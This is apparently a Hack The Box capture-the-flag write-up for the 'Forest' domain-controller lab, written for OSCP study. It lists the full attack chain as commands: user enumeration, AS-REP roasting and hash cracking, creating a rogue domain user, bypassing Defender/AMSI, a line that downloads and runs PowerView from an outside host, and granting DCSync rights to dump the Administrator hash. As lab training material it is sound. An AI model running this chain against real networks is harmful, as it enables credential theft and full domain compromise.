## Forest

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.161 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/a8a3aa80-53ff-4a7a-b87e-8ce174525cbe)

<br>

Only Domain Controller ports open, we can enumerate users with a few tools.

```
enum4linux -a 10.10.10.161

rpcclient -U "" -N 10.10.10.161
enumdomusers

kerbrute userenum --dc 10.10.10.161 -d htb.local /usr/share/wordlists/seclists/Usernames/Names/names.txt

crackmapexec smb 10.10.10.161 -u '' -p '' --users
```

![enumeratingUsers](https://github.com/b1d0ws/OSCP/assets/58514930/92584173-6323-4ae3-a6a3-20deb66daa5e)

![usersTXT](https://github.com/b1d0ws/OSCP/assets/58514930/ab28bed2-89e4-4fdf-95ad-fc29cf0011c6)

<br>

Hunt for users with Kerberoast Pre-auth Not Required and crack the hash with hashcat.

```
impacket-GetNPUsers HTB.LOCAL/ -dc-ip 10.10.10.161 -no-pass -usersfile users.txt
hashcat -m 18200 svc-alfresco /usr/share/wordlists/rockyou.txt
```

![GetNPUsers](https://github.com/b1d0ws/OSCP/assets/58514930/dda3031d-444e-4447-be93-9ef960dcbd3a)

![hashcat](https://github.com/b1d0ws/OSCP/assets/58514930/3b95791c-c8ad-47cb-a480-5c9308172580)

<br>

### Root Flag

Analyzing bloodhound, we can note the following situation:

* svc-alfresco belongs to Service Accounts group;
* Service Accounts group belong to Account Operators;
* Account Operators can create accounts and design groups to users;
* Exchange Windows Permissions group can perform DCSync.

Create a user and add  group Exchange Windows Permissions to him to have DCSync attack privileges.


```
.\SharpHound.exe -c All --zipfilename FOREST
```

![bloodhound](https://github.com/b1d0ws/OSCP/assets/58514930/b0bf6b50-21bb-4115-b279-1dc9e6d26a54)

<br>

```
# Create user and add to groups
net user bido bido123! /add /domain
net group "Exchange Windows Permissions" bido /add
net localgroup "Remote Management Users" bido /add

# Disable defender on EvilWinRM
menu
Bypass-4MSI

# Import Powerview
iex(new-object net.webclient).downloadstring('http://10.10.14.21/PowerView.ps1')

# Give him DCSync rights
$pass = convertto-securestring 'bido123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\bido', $pass)
Add-ObjectACL -PrincipalIdentity bido -Credential $cred -Rights DCSync
```

![creatingUser](https://github.com/b1d0ws/OSCP/assets/58514930/6dc22967-aa4e-49cc-ab02-28c784c0218d)

![importingPowerView](https://github.com/b1d0ws/OSCP/assets/58514930/22fc4d92-6bce-42fa-9ef1-a8ba2de6c93e)

![gettingDCSync](https://github.com/b1d0ws/OSCP/assets/58514930/59e61e84-f65f-4043-b1dd-8f3b9d4955bf)

<br>

Now, perform DCSync to get Administrator hash and login with evilWinRM.

![performingDCSync](https://github.com/b1d0ws/OSCP/assets/58514930/bbea2834-7665-49bb-9a60-78ef7b928170)
